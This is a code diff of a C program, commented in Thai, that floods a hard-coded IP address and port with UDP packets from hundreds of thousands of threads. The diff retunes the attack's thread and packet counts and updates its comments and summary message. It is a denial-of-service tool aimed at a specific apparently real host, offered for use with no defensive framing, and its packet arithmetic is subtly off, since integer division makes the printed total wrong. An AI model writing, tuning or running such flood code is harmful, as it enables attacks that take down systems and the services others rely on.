@@ -7,22 +7,23 @@
 #include <sys/socket.h>
 
 #define PACKET_SIZE 1024
-#define TARGET_PORT 10012  // เปลี่ยนพอร์ตเป็น 10012
-#define TARGET_IP "202.181.72.70"  // เปลี่ยน IP เป็น 202.181.72.70
-#define NUM_THREADS 10000000  // จำนวนเธรดทั้งหมด
-#define PACKETS_PER_THREAD 1  // จำนวนแพ็กเก็ตที่แต่ละเธรดจะส่ง
+#define TARGET_PORT 10012  // พอร์ตเป้าหมาย
+#define TARGET_IP "202.181.72.70"  // IP เป้าหมาย
+#define NUM_THREADS 300000  // จำนวนเธรด
+#define TOTAL_PACKETS 800000  // จำนวนแพ็กเกจทั้งหมด
+#define PACKETS_PER_THREAD (TOTAL_PACKETS / NUM_THREADS)  // แพ็กเกจที่แต่ละเธรดจะส่ง
 
-// โครงสร้างที่ใช้ส่งแพ็กเก็ต
+// โครงสร้างที่ใช้ส่งแพ็กเกจ
 typedef struct {
     int sockfd;
     struct sockaddr_in target_addr;
 } thread_data_t;
 
-// ฟังก์ชันที่ใช้ส่งแพ็กเก็ต UDP
+// ฟังก์ชันที่ใช้ส่งแพ็กเกจ UDP
 void *send_udp_packet(void *arg) {
     thread_data_t *data = (thread_data_t *)arg;
     char packet[PACKET_SIZE];
-    memset(packet, 'X', PACKET_SIZE);  // กำหนดค่าข้อมูลในแพ็กเก็ต
+    memset(packet, 'X', PACKET_SIZE);  // กำหนดค่าข้อมูลในแพ็กเกจ
 
     for (int i = 0; i < PACKETS_PER_THREAD; i++) {
         if (sendto(data->sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&data->target_addr, sizeof(data->target_addr)) == -1) {
@@ -83,6 +84,6 @@ int main() {
     // ปิด socket
     close(sockfd);
 
-    printf("Finished sending 10,000,000 packets.\n");
+    printf("Finished sending 800,000 packets.\n");
     return 0;
 }
